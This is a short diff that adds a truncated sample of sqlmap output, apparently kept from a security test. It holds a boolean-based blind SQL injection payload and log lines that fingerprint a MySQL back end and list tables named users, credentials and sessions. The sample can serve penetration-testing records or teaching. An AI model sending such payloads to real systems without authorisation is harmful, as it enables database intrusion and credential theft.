@@ -1,0 +1,8 @@
+sqlmap output (truncated sample)
+
+[22:01:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+payload: q=' AND 1=1--
+[22:01:13] [INFO] the back-end DBMS is MySQL
+[22:01:14] [INFO] fetching tables
+[22:01:18] [INFO] fetched: users, credentials, sessions
+... (full output stored in this file during testing)
